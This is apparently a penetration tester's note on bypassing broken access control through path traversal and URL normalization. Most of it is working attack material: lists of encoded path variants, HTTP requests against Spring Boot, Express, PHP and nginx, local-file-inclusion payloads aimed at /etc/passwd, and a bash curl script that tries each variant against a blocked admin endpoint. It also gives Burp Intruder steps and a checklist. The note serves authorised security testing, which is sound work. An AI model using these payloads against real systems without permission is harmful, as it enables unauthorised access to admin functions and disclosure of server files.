---
tags: [bac, attack, path-traversal, bypass]
type: attack
severity: high
date: 2026-03-10
---

# 📂 Path Traversal — BAC Bypass via URL Manipulation

## Path Traversal in the BAC Context
Classic path traversal reads arbitrary files (`../../../etc/passwd`). In **BAC context**, path traversal bypasses access control rules that are enforced based on **URL path matching**. The server blocks `/admin` but the ACL rule doesn't account for all valid URL representations of the same path.

---

## How ACL Rules Break

```
Firewall / WAF rule: BLOCK if path starts with "/admin"

Bypass:
  /ADMIN              → case insensitive filesystem
  /admin/             → trailing slash
  /admin//            → double slash
  /admin/./           → dot-slash normalization
  /admin/../admin/    → traversal that resolves to /admin
  /%61dmin/           → URL-decoded to /admin
  /admin%2f           → encoded forward slash
  //admin             → double slash prefix
  /;/admin            → semicolon (Spring Boot behavior)
  /admin;junk=val     → path parameter injection
  /admin%00           → null byte truncation
  /admin%0a           → newline injection
  /admin%09           → tab injection
```

---

## Framework-Specific Bypass Patterns

### Spring Boot (Very Common in Enterprises)
```http
# Spring Boot resolves /..;/ as path separator
GET /actuator/..;/admin/users HTTP/1.1
GET /api/..;/admin/config HTTP/1.1
GET /public/..;/internal/users HTTP/1.1

# Spring strips semicolons before routing in some configs
GET /admin;test/users HTTP/1.1  → may route to /admin/users
```

### Express.js / Node
```http
# Express normalizes paths but some middleware doesn't
GET /admin%2fusers HTTP/1.1    → may bypass middleware
GET /admin/./config HTTP/1.1  → normalized to /admin/config
```

### PHP / Apache
```http
# PHP is case-insensitive on Windows servers
GET /Admin/Users HTTP/1.1
GET /ADMIN/USERS HTTP/1.1

# URL-encoded path separators
GET /admin%2fusers HTTP/1.1
```

### Nginx Misconfigurations
```nginx
# Classic nginx alias traversal
location /files {
    alias /var/www/uploads/;   # Missing trailing slash!
}
# Attack:
GET /files../etc/passwd HTTP/1.1
# Nginx resolves to: /var/www/uploads/../etc/passwd
```

---

## Path Traversal for File Access (BAC + LFI)

```http
# Access files outside web root via path traversal in parameters
GET /download?file=report.pdf
→ Try: ?file=../../../etc/passwd
→ Try: ?file=....//....//etc/passwd
→ Try: ?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
→ Try: ?file=..%252f..%252fetc%252fpasswd (double-encoded)

# Access other users' files
GET /files/users/ME/document.pdf
→ Try: /files/users/../VICTIM_ID/document.pdf
→ Try: /files/users/ME/../../VICTIM_ID/document.pdf
```

---

## ACL Bypass Testing Methodology

```bash
#!/bin/bash
# Test all path traversal variants against a blocked endpoint
TARGET="https://target.com"
BLOCKED_PATH="/admin/users"
COOKIE="session=YOUR_LOW_PRIV_TOKEN"

VARIANTS=(
    "/admin/users"
    "/ADMIN/users"
    "/Admin/users"
    "/admin//users"
    "/admin/./users"
    "/admin/../admin/users"
    "//admin/users"
    "/admin/users/"
    "/admin/users/."
    "/%61dmin/users"
    "/admin%2fusers"
    "/admin%2Fusers"
    "/admin;/users"
    "/admin..;/users"
    "/admin%00/users"
    "/admin%09/users"
    "/admin%0a/users"
    "/admin/users%20"
    "/./admin/users"
    "/admin/users%23"
    "/api/../admin/users"
    "/public/../../admin/users"
)

echo "[*] Testing path traversal variants for $BLOCKED_PATH"
for variant in "${VARIANTS[@]}"; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Cookie: $COOKIE" \
        "$TARGET$variant")
    if [ "$status" != "403" ] && [ "$status" != "401" ] && [ "$status" != "404" ]; then
        echo "[!] $status → $variant"
    fi
done
```

---

## Burp Suite Approach

```
1. Send blocked admin request to Intruder
2. Mark the path: /§admin§/users
3. Payload type: Simple list
4. Add all variants from the list above
5. Run → look for non-403 responses

Also use "403 Bypasser" BApp extension:
  Right-click any blocked request → "Send to 403 Bypasser"
  → Automatically tests 20+ bypass techniques
```

---

## Real-World Impact Examples

```
Finding: /admin/users → 403
Bypass:  /admin;/users → 200

Finding: /internal/export → 403
Bypass:  /api/../internal/export → 200

Finding: /files/admin-config.json → 403
Bypass:  /files/%61dmin-config.json → 200

Finding: Nginx alias: /uploads returns user files
Bypass:  /uploads../etc/nginx/nginx.conf → config file disclosure
```

---

## Tasks
- [ ] #task On every 403 response, test path traversal/normalization variants
- [ ] #task Test Spring Boot `..;/` bypass on Java apps
- [ ] #task Test nginx alias traversal (check for missing trailing slash)
- [ ] #task Install "403 Bypasser" Burp extension for automation
- [ ] #task Test file download params for `../` traversal
- [ ] #task Test URL-encoded variants: %2f, %252f, %61 encoding

---

## 🔗 Related Notes
- [[Privilege-Escalation]]
- [[Forced-Browsing]]
- [[Bypass-Payloads]]
- [[Burp-Suite-BAC]]

---
*Tags: #path-traversal #bac #bypass #attack*
